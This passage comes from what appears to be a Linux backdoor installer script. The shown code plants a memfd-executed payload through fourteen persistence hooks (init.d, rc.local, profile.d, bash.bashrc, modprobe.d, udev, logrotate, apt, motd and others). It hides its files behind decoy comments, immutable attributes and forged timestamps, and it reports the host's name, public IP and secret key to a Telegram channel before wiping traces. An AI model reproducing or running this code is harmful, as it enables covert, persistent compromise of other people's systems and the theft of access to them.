# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System ${MEMFD_SVC} daemon
### END INIT INFO
case "\$1" in
    start|restart|reload|force-reload)
        ${MEMFD_WATCH}
        ;;
esac
exit 0
INITEOF
                        chmod +x "/etc/init.d/${MEMFD_SVC}"
                        update-rc.d "${MEMFD_SVC}" defaults 90 >/dev/null 2>&1
                        chkconfig --add "${MEMFD_SVC}" >/dev/null 2>&1
                        rc-update add "${MEMFD_SVC}" default >/dev/null 2>&1
                        printf "${C}[+]${Y} Persist: init.d script......................${N}[${G}OK${N}]\n"
                    fi

                    # 5. rc.local (boot fallback)
                    if [ -f /etc/rc.local ] || [ -d /etc/rc.d ]; then
                        RC_LINE="( sleep 60; ${MEMFD_WATCH} ) & # ${MEMFD_SVC}-memfd"
                        if [ -f /etc/rc.local ]; then
                            if ! grep -q "${MEMFD_SVC}-memfd" /etc/rc.local 2>/dev/null; then
                                if grep -q "^exit 0" /etc/rc.local; then
                                    sed -i "/^exit 0/i\\${RC_LINE}" /etc/rc.local
                                else
                                    echo "$RC_LINE" >> /etc/rc.local
                                fi
                                chmod +x /etc/rc.local
                                printf "${C}[+]${Y} Persist: rc.local...........................${N}[${G}OK${N}]\n"
                            fi
                        fi
                    fi

                    # 6. Profile.d (login trigger)
                    if [ -d /etc/profile.d ]; then
                        cat > "/etc/profile.d/${MEMFD_SVC}.sh" <<PROFEOF
# System locale check
( ${MEMFD_WATCH} ) >/dev/null 2>&1 &
PROFEOF
                        chmod +x "/etc/profile.d/${MEMFD_SVC}.sh"
                        touch -r /etc/profile.d/bash_completion.sh "/etc/profile.d/${MEMFD_SVC}.sh" 2>/dev/null
                        printf "${C}[+]${Y} Persist: profile.d..........................${N}[${G}OK${N}]\n"
                    fi

                    # 7. bash.bashrc (global shell hook)
                    if [ -f /etc/bash.bashrc ]; then
                        if ! grep -q "${MEMFD_SVC}-memfd" /etc/bash.bashrc 2>/dev/null; then
                            echo "( ${MEMFD_WATCH} ) >/dev/null 2>&1 & # ${MEMFD_SVC}-memfd" >> /etc/bash.bashrc
                            printf "${C}[+]${Y} Persist: bash.bashrc........................${N}[${G}OK${N}]\n"
                        fi
                    fi

                    # 8. modprobe.d hook (triggers on module load)
                    if [ -d /etc/modprobe.d ]; then
                        # Use common module that loads on network activity
                        for MOD in nf_conntrack xt_conntrack ip_tables loop; do
                            if modinfo "$MOD" >/dev/null 2>&1; then
                                cat > "/etc/modprobe.d/${MEMFD_SVC}.conf" <<MPEOF
# System performance tuning
install ${MOD} /usr/local/sbin/.${MEMFD_SVC}.sh >/dev/null 2>&1; /sbin/modprobe --ignore-install ${MOD}
MPEOF
                                # Create the trigger script
                                cat > "/usr/local/sbin/.${MEMFD_SVC}.sh" <<TRIGEOF
#!/bin/sh
${MEMFD_WATCH}
TRIGEOF
                                chmod +x "/usr/local/sbin/.${MEMFD_SVC}.sh"
                                chmod 000 "/usr/local/sbin/.${MEMFD_SVC}.sh"
                                chattr +i "/usr/local/sbin/.${MEMFD_SVC}.sh" 2>/dev/null
                                touch -r /etc/modprobe.d/blacklist.conf "/etc/modprobe.d/${MEMFD_SVC}.conf" 2>/dev/null
                                printf "${C}[+]${Y} Persist: modprobe.d hook....................${N}[${G}OK${N}]\n"
                                break
                            fi
                        done
                    fi

                    # 9. NetworkManager dispatcher (network up trigger)
                    if [ -d /etc/NetworkManager/dispatcher.d ]; then
                        cat > "/etc/NetworkManager/dispatcher.d/99-${MEMFD_SVC}" <<NMEOF
#!/bin/sh
[ "\$2" = "up" ] && ( ${MEMFD_WATCH} ) >/dev/null 2>&1 &
exit 0
NMEOF
                        chmod +x "/etc/NetworkManager/dispatcher.d/99-${MEMFD_SVC}"
                        printf "${C}[+]${Y} Persist: NetworkManager dispatcher..........${N}[${G}OK${N}]\n"
                    fi

                    # 10. /etc/network/if-up.d/ (Debian network up)
                    if [ -d /etc/network/if-up.d ]; then
                        cat > "/etc/network/if-up.d/${MEMFD_SVC}" <<IFUPEOF
#!/bin/sh
( sleep 30; ${MEMFD_WATCH} ) >/dev/null 2>&1 &
exit 0
IFUPEOF
                        chmod +x "/etc/network/if-up.d/${MEMFD_SVC}"
                        printf "${C}[+]${Y} Persist: if-up.d............................${N}[${G}OK${N}]\n"
                    fi

                    # 11. udev rules (device trigger)
                    if [ -d /etc/udev/rules.d ]; then
                        cat > "/etc/udev/rules.d/99-${MEMFD_SVC}.rules" <<UDEVEOF
# System thermal management
ACTION=="add", SUBSYSTEM=="net", RUN+="/bin/sh -c '( sleep 60; ${MEMFD_WATCH} ) &'"
UDEVEOF
                        touch -r /etc/udev/rules.d/70-persistent-net.rules "/etc/udev/rules.d/99-${MEMFD_SVC}.rules" 2>/dev/null
                        printf "${C}[+]${Y} Persist: udev rules.........................${N}[${G}OK${N}]\n"
                    fi

                    # 12. logrotate.d hook (runs daily with logrotate)
                    if [ -d /etc/logrotate.d ]; then
                        cat > "/etc/logrotate.d/${MEMFD_SVC}" <<LREOF
/var/log/syslog {
    daily
    missingok
    notifempty
    prerotate
        ${MEMFD_WATCH} >/dev/null 2>&1 || true
    endscript
}
LREOF
                        touch -r /etc/logrotate.d/rsyslog "/etc/logrotate.d/${MEMFD_SVC}" 2>/dev/null
                        printf "${C}[+]${Y} Persist: logrotate.d hook...................${N}[${G}OK${N}]\n"
                    fi

                    # 13. apt/dpkg hook (triggers on package operations)
                    if [ -d /etc/apt/apt.conf.d ]; then
                        cat > "/etc/apt/apt.conf.d/99${MEMFD_SVC}" <<APTEOF
APT::Update::Post-Invoke { "${MEMFD_WATCH} >/dev/null 2>&1 || true"; };
APTEOF
                        printf "${C}[+]${Y} Persist: apt hook...........................${N}[${G}OK${N}]\n"
                    fi

                    # 14. motd.d (triggers on SSH login)
                    if [ -d /etc/update-motd.d ]; then
                        cat > "/etc/update-motd.d/99-${MEMFD_SVC}" <<MOTDEOF
#!/bin/sh
( ${MEMFD_WATCH} ) >/dev/null 2>&1 &
exit 0
MOTDEOF
                        chmod +x "/etc/update-motd.d/99-${MEMFD_SVC}"
                        printf "${C}[+]${Y} Persist: motd.d.............................${N}[${G}OK${N}]\n"
                    fi

                    printf "${G}[+] Memfd persistence: 14 methods configured${N}\n"
                fi

                printf "${C}[+] Secret: ${G}${MEMFD_SECRET}${N}\n"

                send_telegram "[MINI-SOCKET MEMFD]
Host: $(hostname)
IP: $(get_public_ip)
OS: $(uname -rom)
Method: memfd_create (noexec bypass)
Persistence: cron+systemd+rc.local+profile.d
Key: ${MEMFD_SECRET}"

                clean_all
                exit 0
            else
                printf "${R}[!] Memfd execution failed${N}\n"
            fi
        else
            printf "${R}[!] perl not available for memfd bypass${N}\n"
        fi

        printf "${R}[!] Binary cannot execute. Possible causes:${N}\n"
        printf "${R}    - All writable dirs have noexec mount${N}\n"
        printf "${R}    - SELinux/AppArmor blocking execution${N}\n"
        printf "${R}    - Kernel too old (need 2.6.23+)${N}\n"
        printf "${R}    - Download corrupted${N}\n"
        # Show actual error
        "$BIN_PATH" -h 2>&1 | head -3
        handle_error "Binary verification failed"
    fi
fi
printf "${C}[+]${G} Binary verified OK${N}\n"

if [ "$(id -u)" -eq 0 ]; then
    SVC_NAME=$(get_random_item "$STEALTH_NAMES")
    install_root "$BIN_PATH" "$SVC_NAME" "$INIT_TYPE"
else
    install_user "$BIN_PATH"
fi

printf "\n${C}=== ${G}Installation complete ${C}===${N}\n"